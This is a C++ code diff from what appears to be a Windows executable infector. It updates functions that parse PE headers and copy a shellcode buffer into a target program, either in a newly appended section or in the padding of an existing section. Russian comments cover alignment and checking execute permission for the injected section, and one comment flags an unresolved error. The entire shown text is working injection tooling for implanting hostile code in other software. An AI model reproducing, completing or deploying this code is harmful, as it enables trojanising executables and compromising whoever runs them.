@@ -43,7 +43,7 @@ int getAllign(int size, int allign){
     return ((size / allign) + 1) * allign;
 }
 
-size_t rvaToOffset(DWORD RVA, IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
+size_t rvaToOffset(DWORD RVA, IMAGE_NT_HEADERS32* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
     for(int i=0; i< ntHdr->FileHeader.NumberOfSections; i++){
         auto curSct = sctHdr[i];
         if(RVA >= curSct.VirtualAddress &&
@@ -54,7 +54,7 @@ size_t rvaToOffset(DWORD RVA, IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* sct
     return 0;
 }
 
-size_t offsetToRva(DWORD raw_offset ,IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
+size_t offsetToRva(DWORD raw_offset ,IMAGE_NT_HEADERS32* ntHdr, IMAGE_SECTION_HEADER* sctHdr){
     for(int i=0; i< ntHdr->FileHeader.NumberOfSections; i++){
         auto curSct = sctHdr[i];
         if(raw_offset >= curSct.PointerToRawData &&
@@ -66,7 +66,7 @@ size_t offsetToRva(DWORD raw_offset ,IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEAD
     return 0;
 }
 
-void findPEInfo(IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* secHdr, char* ptrToPad, char* outfile, PPE_INFO peInfo){
+void findPEInfo(IMAGE_NT_HEADERS32* ntHdr, IMAGE_SECTION_HEADER* secHdr, char* ptrToPad, char* outfile, PPE_INFO peInfo){
 
     int endOffset = 0;
     int startOffset = 0;
@@ -100,9 +100,8 @@ void findPEInfo(IMAGE_NT_HEADERS* ntHdr, IMAGE_SECTION_HEADER* secHdr, char* ptr
 int createNewSect(char *buff, DWORD fileSize,char *outfile, char *fileName){
 
     IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*) buff;
-    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*) (size_t(dosHdr)+dosHdr->e_lfanew);
+    IMAGE_NT_HEADERS32* ntHdr = (IMAGE_NT_HEADERS32*) (size_t(dosHdr)+dosHdr->e_lfanew);
     IMAGE_SECTION_HEADER* secHdr = (IMAGE_SECTION_HEADER*)(size_t(ntHdr) + sizeof(*ntHdr));
-
     if(dosHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdr->Signature != IMAGE_NT_SIGNATURE){
         puts("[-] file may be broken");
         return 1;
@@ -118,7 +117,7 @@ int createNewSect(char *buff, DWORD fileSize,char *outfile, char *fileName){
 
 
     IMAGE_DOS_HEADER* newDosHdr = (IMAGE_DOS_HEADER*) outfile;
-    IMAGE_NT_HEADERS* newNtHdr = (IMAGE_NT_HEADERS*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
+    IMAGE_NT_HEADERS32* newNtHdr = (IMAGE_NT_HEADERS32*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
     IMAGE_SECTION_HEADER* newSecHdr = (IMAGE_SECTION_HEADER*)(size_t(newNtHdr) + sizeof(*newNtHdr));
 
     if(newDosHdr->e_magic != IMAGE_DOS_SIGNATURE || newNtHdr->Signature != IMAGE_NT_SIGNATURE){
@@ -146,6 +145,7 @@ int createNewSect(char *buff, DWORD fileSize,char *outfile, char *fileName){
     newSectHdr2->PointerToRawData = lastSectHdr->PointerToRawData + lastSectHdr->SizeOfRawData;
     newNtHdr->FileHeader.NumberOfSections += 1;
 
+    //Pointer is  the shift from base image address !!!!!!!!!eror
     memcpy(outfile + newSectHdr2->PointerToRawData, code, sizeof(code));
 
     puts("[+] repair virtual size");
@@ -174,8 +174,12 @@ int createNewSect(char *buff, DWORD fileSize,char *outfile, char *fileName){
 
 int injectInPadding(char *buff, DWORD fileSize,char *outfile, char *fileName, int number){
     IMAGE_DOS_HEADER* dsHdr = (IMAGE_DOS_HEADER*)buff;
-    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)(size_t(dsHdr) + dsHdr->e_lfanew);
+    IMAGE_NT_HEADERS32* ntHdr = (IMAGE_NT_HEADERS32*)(size_t(dsHdr) + dsHdr->e_lfanew);
     IMAGE_SECTION_HEADER* secHdr = (IMAGE_SECTION_HEADER*)(size_t(ntHdr) + sizeof(*ntHdr));
+    //применяется при выравнивании сырой программы
+    auto fileAllign = ntHdr->OptionalHeader.FileAlignment;
+    //применяется при выравнивании в памяти
+    auto sectAllign = ntHdr->OptionalHeader.SectionAlignment;
 
     if(dsHdr->e_magic != IMAGE_DOS_SIGNATURE || ntHdr->Signature != IMAGE_NT_SIGNATURE){
         puts("[!] file may be broken!");
@@ -186,7 +190,7 @@ int injectInPadding(char *buff, DWORD fileSize,char *outfile, char *fileName, in
     memcpy(outfile, buff, fileSize);
 
     IMAGE_DOS_HEADER* newDosHdr = (IMAGE_DOS_HEADER*) outfile;
-    IMAGE_NT_HEADERS* newNtHdr = (IMAGE_NT_HEADERS*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
+    IMAGE_NT_HEADERS32* newNtHdr = (IMAGE_NT_HEADERS32*) (size_t(newDosHdr)+newDosHdr->e_lfanew);
     IMAGE_SECTION_HEADER* newSecHdr = (IMAGE_SECTION_HEADER*)(size_t(newNtHdr) + sizeof(*newNtHdr));
 
     char* ptrToPad;
@@ -195,17 +199,17 @@ int injectInPadding(char *buff, DWORD fileSize,char *outfile, char *fileName, in
 
     PPE_INFO peInfo = new PE_INFO[ntHdr->FileHeader.NumberOfSections];
     findPEInfo(ntHdr, secHdr, ptrToPad, outfile, peInfo);
-    
+
     printf("[+] check if there is enough place for shellcode \n");
-//    int endOffset = 0;
-//    int startOffset = 0;
+    int endOffset = 0;
+    int startOffset = 0;
 
-
+    // !!!!
     if(!(peInfo[number].Size > 0)){
         printf("[-] cant't inject in section %i", number+1);
         return 1;
     }
-
+// !! ПРОВРИТЬ разрешение на исполнение в секции в которой заинжектился shellcode
     int shell_start_offset = peInfo[number].StartOffset;
     int shell_end_offset = shell_start_offset + sizeof(code);
     ptrToPad = outfile + shell_start_offset;
